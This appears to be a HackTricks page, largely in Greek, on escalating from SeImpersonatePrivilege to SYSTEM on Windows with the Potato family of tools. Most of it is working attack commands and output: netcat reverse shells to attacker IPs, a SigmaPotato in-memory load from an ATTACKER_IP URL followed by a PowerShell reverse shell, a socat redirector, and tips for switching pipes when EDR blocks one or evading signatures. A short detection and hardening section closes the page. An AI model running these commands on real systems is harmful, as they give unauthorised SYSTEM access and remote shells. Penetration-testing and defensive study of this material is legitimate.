# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** σε Windows Server 2019 και Windows 10 build 1809 και μετά. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να χρησιμοποιηθούν για να εκμεταλλευτούν τα ίδια προνόμια και να αποκτήσουν πρόσβαση επιπέδου `NT AUTHORITY\SYSTEM`.** Αυτό το [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) αναλύει σε βάθος το εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για να καταχραστεί τα impersonation privileges σε hosts Windows 10 και Server 2019 όπου το JuicyPotato δεν λειτουργεί πλέον.

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται συχνά το 2024–2025 είναι η SigmaPotato (ένα fork του GodPotato) η οποία προσθέτει χρήση in-memory/.NET reflection και εκτεταμένη υποστήριξη OS. Δείτε τη γρήγορη χρήση παρακάτω και το repo στις Αναφορές.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και συνηθισμένες παγίδες

Όλες οι παρακάτω τεχνικές βασίζονται στην κατάχρηση μιας υπηρεσίας με δυνατότητα impersonation που τρέχει με προνόμια, από ένα περιβάλλον που κατέχει κάποιο από τα ακόλουθα προνόμια:

- SeImpersonatePrivilege (το πιο συνηθισμένο) ή SeAssignPrimaryTokenPrivilege
- Δεν απαιτείται High integrity εάν το token έχει ήδη SeImpersonatePrivilege (τυπικό για πολλούς service accounts όπως IIS AppPool, MSSQL, κ.λπ.)

Ελέγξτε γρήγορα τα προνόμια:
```cmd
whoami /priv | findstr /i impersonate
```
Λειτουργικές σημειώσεις:

- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). Σε περιβάλλοντα με αυστηρή θωράκιση όπου ο Spooler έχει απενεργοποιηθεί μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. Αν το egress είναι μπλοκαρισμένο, χρησιμοποιήστε redirector/port-forwarder (βλέπε παράδειγμα παρακάτω). Παλαιότερες εκδόσεις χρειάζονταν το -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; αν ένας pipe είναι μπλοκαρισμένος, δοκιμάστε εναλλακτικούς pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; δοκιμάστε διαφορετικό pipe/transport ή βεβαιωθείτε ότι η στοχευόμενη υπηρεσία εκτελείται.

## Γρήγορη επίδειξη

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notes:
- Μπορείτε να χρησιμοποιήσετε -i για να δημιουργήσετε μια interactive process στην τρέχουσα κονσόλα, ή -c για να εκτελέσετε ένα one-liner.
- Απαιτείται η υπηρεσία Spooler. Εάν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Αν η εξερχόμενη θύρα 135 είναι αποκλεισμένη, pivot the OXID resolver μέσω socat στον redirector σου:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν ένας pipe αποτύχει ή το EDR τον μπλοκάρει, δοκιμάστε τους άλλους υποστηριζόμενους pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν το SeImpersonatePrivilege είναι παρόν.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν service DCOM objects που από προεπιλογή έχουν RPC_C_IMP_LEVEL_IMPERSONATE. Χτίστε ή χρησιμοποιήστε τα παρεχόμενα binaries και εκτελέστε την εντολή σας:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ενημερωμένο fork του GodPotato)

Το SigmaPotato προσθέτει σύγχρονες βελτιώσεις όπως in-memory execution μέσω .NET reflection και ένα βοηθητικό PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Σημειώσεις ανίχνευσης και θωράκισης

- Παρακολουθήστε για διεργασίες που δημιουργούν named pipes και αμέσως καλούν token-duplication APIs, ακολουθούμενες από CreateProcessAsUser/CreateProcessWithTokenW. Το Sysmon μπορεί να εμφανίσει χρήσιμη τηλεμετρία: Event ID 1 (process creation), 17/18 (named pipe created/connected), και γραμμές εντολών που δημιουργούν child processes ως SYSTEM.
- Spooler hardening: Απενεργοποίηση της υπηρεσίας Print Spooler σε servers όπου δεν είναι απαραίτητη αποτρέπει PrintSpoofer-style local coercions μέσω spoolss.
- Service account hardening: Ελαχιστοποιήστε την ανάθεση SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege σε custom services. Σκεφτείτε να τρέχετε υπηρεσίες υπό virtual accounts με τα ελάχιστα απαιτούμενα privileges και να τις απομονώνετε με service SID και write-restricted tokens όταν είναι δυνατόν.
- Network controls: Το μπλοκάρισμα outbound TCP/135 ή ο περιορισμός της κίνησης RPC endpoint mapper μπορεί να σπάσει το RoguePotato εκτός αν υπάρχει internal redirector.
- EDR/AV: Όλα αυτά τα εργαλεία είναι ευρέως signatured. Η επανασυγκρότηση από source, η μετονομασία symbols/strings ή η χρήση in-memory execution μπορεί να μειώσει τον εντοπισμό αλλά δεν θα αποτρέψει αξιόπιστες behavioral detections.

## Αναφορές

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
